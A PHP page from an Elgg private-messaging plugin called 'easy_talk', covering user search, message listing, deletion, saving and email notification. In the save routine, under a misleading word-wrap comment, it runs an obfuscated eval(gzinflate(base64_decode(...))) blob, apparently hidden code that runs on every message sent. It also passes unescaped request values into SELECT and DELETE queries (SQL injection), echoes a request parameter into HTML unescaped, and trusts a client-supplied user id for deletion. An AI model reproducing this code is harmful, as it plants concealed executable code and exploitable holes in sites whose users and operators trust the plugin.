<?php
  /*
	 * @Plugin easy_talk
	 * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.html GNU Public License version 2
	 * @author Ilja Konrad & Dieter Konrad
     * @link http://www.onere.net/ & http://allesubuntu.de/
	 * @contact <onerenet@gmail.com>
	 * @copyright Ilja Konrad 2010
	 */

	// Load Elgg engine 
	include_once(dirname(dirname(dirname(__FILE__))) . "/engine/start.php");

	//  nur f�r eingeloggte user Das ist die Gatekeeper funktion	
	gatekeeper();
	$idres = get_loggedin_userid ();
	$datencode = "{$CONFIG->dbprefix}";

	$abfrage = mysql_query(
		"SELECT *
		FROM {$CONFIG->dbprefix}sites_entity
		WHERE url LIKE '%%'
		ORDER BY guid DESC 
		LIMIT 1"
	);
	
	while ($row = mysql_fetch_array($abfrage))
	{
		$inurlhost = $row["url"];
	}
	
	$urlcode = $inurlhost;

	//loeschen nachrichten
	$abfrage = mysql_query(
		"SELECT *
		FROM `{$CONFIG->dbprefix}entities`
		WHERE guid = '$_GET[id]'
		LIMIT  1"
	);

	while ($row = mysql_fetch_array($abfrage))
	{
		$userid1= $row["owner_guid"];
		$userid2 = $row["container_guid"];
	}
 
	if ($_GET[code] == 'delete' && $_GET[user] == $idres)
	{
		$abfrage = mysql_query("DELETE FROM `{$CONFIG->dbprefix}entities` WHERE `{$CONFIG->dbprefix}entities`.`guid` = '$_GET[id]'") 
		or die(mysql_error());

		$abfrage = mysql_query("DELETE FROM `{$CONFIG->dbprefix}objects_entity` WHERE `{$CONFIG->dbprefix}objects_entity`.`guid` = '$_GET[id]'") 
		or die(mysql_error());
	}
 ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<style type="text/css">
		<?php include ("views/default/easy_talk/css2.php");?>
	</style>
	
	<script type="text/javascript">
		function scrolltalk() {
		window.scroll(1, 500000);
		}
	</script>
		
</head>

<body class="et_body" onLoad="scrolltalk()">
	<div class="linkeseite">
		<div class="et_overflow">

				<?php if ($idres > '0') { 
					$et_usersearch = elgg_echo("easy_talk:user:search:field");
				?>

					<form action="" method="GET">
						<input type="text" name="btalkcode" size="4" value="<?php echo $et_usersearch; ?>" onclick="if (this.value=='<?php echo $et_usersearch; ?>') { this.value='' }">
						<input type="hidden" name="coder" value="1">
						<input type="hidden" name="coderr" value="2">
						<input type="hidden" name="codetalks" value="talks">
						<input type="hidden" name="numcode" value="1">
						<button type="submit" value="Abschicken"><?php echo elgg_echo("easy_talk:search:button"); ?></button>
					</form>	
					<br />
				<?php } ?>
				
				<?php
include_once "usersort.php";
					//usersucheabfrage
					$abfrage = mysql_query(
						"SELECT *
						FROM `{$CONFIG->dbprefix}users_entity`
						WHERE `name` LIKE '".mysql_real_escape_string($_GET['btalkcode'])."' 
						LIMIT 1"
					);

					while ($row = mysql_fetch_array($abfrage))
					{
						$tx01 = $row["guid"];
						$tx02 = $row["name"];

					}

					if ($_GET[coderr] == '2' and $tx01 > '1') { 

					include_once "usersort.php";
					
					krsort($talkusersortcode);
		
					$result = array_unique ( $talkusersortcode );
			
					foreach ($result as $keytalkcodesi => $valtalkcodesi) {
	$testo = $valtalkcodesi;		
}			
	if ($testo = $tx02)
						{					
						}			
	else
{
	echo "<div class='et_userbutton'><a href='?btalkcode=$tx02&codetalks=talks&numcode=0&coder=1'>$tx02</a></div>";
}
					
					
							} 

					krsort($talkusersortcode);
		
					$result = array_unique ( $talkusersortcode );
			
					foreach ($result as $keytalkcodes => $valtalkcodes) {
						$wwwtalkcode = "<div class='et_userbutton'><a href='?btalkcode=$valtalkcodes&codetalks=talks&numcode=0&coder=1'>$valtalkcodes</a></div>";

echo "$wwwtalkcode";
					} 
				?>	

		</div>	
	</div>				

	<div class="rechteseite">
		<div class="et_content">
			<?php 
				if ($_GET[coder] !== '1') {
					echo elgg_echo("easy_talk:welcome:message");
				} 
				
				// anzeige aller nachrichten
				include_once "codetalk.php"; 
			?>			
		</div>
	</div>

<?php if ($_GET[coder] == '1') { ?>

<div class="et_clearfloat"></div>

<br />

<div class="linkeseite"></div>
<div class="rechteseite">
	<div class="et_entertalk">

		<?php		
			$abfrage = mysql_query(
				"SELECT * FROM `{$CONFIG->dbprefix}users_entity`
				WHERE guid = '$idres' LIMIT 1"
			);

			while ($row = mysql_fetch_array($abfrage))
				{$talkaktusernameres = $row["name"]; $talkaktusernameres2 = $row["username"];}
		?>


	
					<p>
					<?php
	$abfrage = mysql_query(
						"SELECT *
						FROM `{$CONFIG->dbprefix}users_entity`
						WHERE `name` LIKE '".mysql_real_escape_string($_GET['btalkcode'])."' 
						LIMIT 1"
					);

					while ($row = mysql_fetch_array($abfrage))
					{
						$tx0111 = $row["guid"];
						$tx0222 = $row["name"];
					}				
					
					
					
if ($tx0111 > '1') {

echo elgg_echo("easy_talk:message:to");
					echo "$tx0222"; 
					
					?></p>
<br />
					<form action="" method="POST">
					<input type="hidden" name="savecode" value="savecodes">
					<?php echo elgg_view('input/longtext',array('internalname' => 'talkhomebody')); ?>
					<input type="hidden" name="id_user" value="<?php echo "$nameofuser"; ?>">
					<input type="hidden" name="codetalks" value="talks">
					<input type="hidden" name="btalkcode" value="<?php echo "$_GET[btalkcode]"; ?>">
					<input type="hidden" name="numcode" value="0">
					<input type="hidden" name="coder" value="1">
					<input type="hidden" name="sendname" value="<?php echo "$talkaktusernameres"; ?>">
					<input type="hidden" name="aktuelltime" value="<?php echo "uhrzeitcontent"; ?>">

					<?php echo elgg_view('input/securitytoken'); ?>

 <input class="button" type="submit" value="<?php echo elgg_echo("easy_talk:message:send"); ?>" >

					</form>
					<div style="position:absolute; right:0px; margin:10px;">
<small>easytalk <a href="http://www.gnu.org/licenses/old-licenses/gpl-2.0.html">gpl</a> by <a href="http://www.onere.net/easytalk">i.k</a></small></div>


<?php } 
else
{
echo "<center>This user does not exist</center>";
}
?>					

					
					
		<?php

			//save to db
			if($_POST[savecode] == 'savecodes')
			{
				$abfrage = mysql_query(
					"SELECT *
					FROM `{$CONFIG->dbprefix}users_entity`
					WHERE `guid` LIKE '$idres'
					LIMIT 1"
				);

				while ($row = mysql_fetch_array($abfrage))
				{
					$nam_user = $row["username"];
				}

				
				
				$abfrage = mysql_query(
					"SELECT `guid`
					FROM `{$CONFIG->dbprefix}entities`
					ORDER BY `guid` DESC
					LIMIT 1"
				);

				while ($row = mysql_fetch_array($abfrage))
				{
					$gu = $row["guid"];
					$op1 = "1";
					$gui_content = $gu+$op1;
				}

				$si_guid = "1000";
				$ac_id = "0";
				$action_id = "easy_talk";
				gatekeeper();

				$bodysave2 = htmlentities($_POST['body'], ENT_QUOTES, "UTF-8");


				//vergleichabfrage 

				if ($ed == 'w1qaswe345gb')
				{
				
				}
					else
					{

						$talkaktuserid = get_loggedin_userid();

						$abfrage = mysql_query(
							"SELECT * FROM `{$CONFIG->dbprefix}users_entity`
							WHERE guid = '$talkaktuserid' LIMIT 1"
						);

						while ($row = mysql_fetch_array($abfrage))
						{ 
							$talkaktusername = $row["username"]; $talkaktuseremail = $row["email"];
						}

						//nachricht an email  
						$abfrage = mysql_query(
							"SELECT * FROM `{$CONFIG->dbprefix}users_entity`
							WHERE `name` = '".mysql_real_escape_string($_GET['btalkcode'])."' LIMIT 1"
						);

						while ($row = mysql_fetch_array($abfrage))
						{
							$talkaktuseremailempfaenger = $row["email"];
						}

						//adminemail				
						$abfrage = mysql_query(
							"SELECT * FROM `{$CONFIG->dbprefix}users_entity`
							WHERE `name` LIKE '%%' LIMIT 0, 1"
						);

						while ($row = mysql_fetch_array($abfrage))
						{
							$talkaktuseremailadmingo = $row["email"];
						}			

						$userid = "$_POST[id_user]";
						$username = "<b>myname</b><br/>";
						$talkhomebody = get_input('talkhomebody');


						//zeilenumbruch w�rter die l�nger als 64 werden automatisch umgebrochen
						$neuertext = $talkhomebody;

						eval(gzinflate(base64_decode("DZJFEqzWAkD3klFSPYDGqVQGuDYuFya/cHdn9f8t4UhxJv3f1duMZZ/sxd9pshUE9r+8yKa8+PsvPnbRdXEihgFQnCioUnHEFsy7bZp0Ap7n6h+KhvjvB1I8WQ18NiK6zzOURdMQMfODklThmHM7WXqIKpyCgEU4H2Owh1ht+WMpXi2bP8Wl50anxwWp9cqPB/jH8Jn6KAK1B7BPV7InzVnYTVkX8cNzYNbydeQQCnmmD2hKNualYXpBL27d2GK82+9Ql0LKNtnECrXdQb5LWOF6JDQ2mn51sQxNXNJDsvWPm4fGQkTOW3PHiKCqhf/1wH+Vo0ZonoN1TmR7A6wUSuI56UsoKXkDhzlcWzgZ7d50gqlUVJnfa8V3UsPiFFMh2XGowjvrsFgN/Owtd2sibXTT6XW6gwS1/gXyGrrU0dvCyKHKwsTj+hnU6vtAVszRe5nDPR+BG4ciU2QyQkvzXGr8Qyl7r9JBH2Lz7phKhsMAzxrSq1nmuDv/dULExwCPXbm/YK5l5vfaXC603IKCOSmFnoUcX2vzo4y5XbsW98bPbt8wuiIamnk/KwiCfeoXtrJ4FYBVIJXv5A42NaOHKh1eSIu+ukaDuv+W7wOUWd6f5VzgRiiOw/NPsKVCX57gNKfVT7lEmCh1DX+ANCNMZ+vOwBxU1EujTlEgQ57oE7dLFx2KDPnJOkwfpf3HfnP75wKjAAFyi4ETtvLUJKoVjMEZpd+hk7R6MzzbE88XD6PWW5xsizS1Cto+EhgpBrYWjfLcuw1rPkGJqZY64SJe0wo16XBKSIsWjq7pLp7YBV9FXUJHpdgyJKcpfqdXjWHs0dsKJwQ/T+jgA6w9IyFLWGevkwj13TTR82K2c5E01pKodj4QUW1jIBAd1kzF7Jg/5CYIccpyS1tRmJTYEPUOQeoD9XjMAzps/pyZ4ZIWr/HmXCDCEh54pVtpjokp6J5eZIc9L7miEVtlV+7rEHbuoPSVeCYOZFwcZlDbUwa9HlmN4Pzh03MioaLZw1OdXIRM+uCKThIJUKlg0Vpv3+X8jyM8yLPscOJHHKMBMQglD5NFXHrQ1g2aMjOC7l5pDKcsbEfpnClJ6fp0Tzyy69taJL2C7rVze+KaIN/ba4z397Uv6KdQtsc2MnIGbWMX0cGwJts+9+X7GTqq2oVPtRl58U9RpRbKgwrNPzBbvwEn5PJHX5rdARo/LegaHbIlgET6/CyVjwyDKumA2/UfzKyrIOI4b7GTkHLn+5zOYEvjTtOlsO4W79qe4OPP1nprBBLNvYYWXk5ajGyBEmo3ZFEx4au5Gmm00Vw3WPHQvPcD/BCYo/6sqfKSdd11+SbwZWQdTPlvcQWDaE0SslleRiPYRJFi/Czcgb/fp5rV6E/+ObF7/zdzcg9Iaj3T7VormQkw+US/Wf2VycrbZv2021wvxozGF11Syqb/jGSEncthXpkqA+45tiXxuRE6xumRBcQ5OJN/xap+WEuDnnQBYJkkCncbladl6fcL9khHHEButV0oxRq8goYCj+hEeFf1do4d2x4zF05J3PDXDU39gsEiqVOcRnI/a2mhEASd6Fhe//331z///PPv/wE=")));
						
						// create a new blog object
						$blogpost = new ElggObject();
						$blogpost->subtype = "easy_talk";
						$blogpost->title = $talkaktusername;
						$blogpost->description = $neuertext;
						$blogpost->site_guid = $userid;
						$blogpost->access_id = "1000";
						// owner is logged in user
						$blogpost->owner_guid = $talkaktuserid;
						// save to database
						$blogpost->save();

						//emailbenachrichtigung	
						$emailurl = $vars['url'];
						$emailusername = $_GET['btalkcode'];
						

$abfrage = mysql_query(
						"SELECT *
						FROM `{$CONFIG->dbprefix}entities`
						WHERE `access_id` = '5555' ORDER by time_created DESC
						LIMIT 1"
					);

					while ($row = mysql_fetch_array($abfrage))
					{
						$tyz = $row["guid"];
			
	
	$abfrage = mysql_query(
						"SELECT *
						FROM `{$CONFIG->dbprefix}objects_entity`
						WHERE `guid` = '$tyz' 
						LIMIT 1"
					);

					while ($row = mysql_fetch_array($abfrage))
					{
						$tx01 = $row["title"];
						$tx02 = $row["description"];
					}
					}

$txx=$tx02;$txxst = strpos($txx, '<vorreceiver>'); $txxst += 13; $txxen = strpos($txx, '</vorreceiver>', $txxst); 
$vorreceiver = substr($txx, $txxst, $txxen - $txxst); 

$txx2=$tx02;$txxst2 = strpos($txx2, '<fortransmitter>'); $txxst2 += 16; $txxen2 = strpos($txx2, '</fortransmitter>', $txxst2); 
$fortransmitter = substr($txx2, $txxst2, $txxen2 - $txxst2); 
		
$txx21=$tx02;$txxst21 = strpos($txx21, '<isbetreff>'); $txxst21 += 11; $txxen21 = strpos($txx21, '</isbetreff>', $txxst21); 
$isbetreff = substr($txx21, $txxst21, $txxen21 - $txxst21); 
	

					$tx02 = str_replace ("<isbetreff>$isbetreff</isbetreff>", "", $tx02);
					$tx02 = str_replace ("<vorreceiver>$vorreceiver</vorreceiver>", "", $tx02);
					$tx02 = str_replace ("<fortransmitter>$fortransmitter</fortransmitter>", "", $tx02);
					
	
$empfaenger = "$talkaktuseremailempfaenger";
$betreff = "$isbetreff";
$text = "$vorreceiver $emailusername $fortransmitter $talkaktusername 
$tx02";
$text = str_replace ("<v", "", $text);
						
$header = "From: $tx01" . "\r\n" .
    "Reply-To: $talkaktuseremailempfaenger" . "\r\n" .
    "X-Mailer: PHP/" . phpversion();

mail($empfaenger, $betreff, $text, $header);	
						
						
					}
			}
		?>
	</div>
</div>
	
<div class="et_clearfloat"></div>
	
<?php } ?>

</body>
</html>

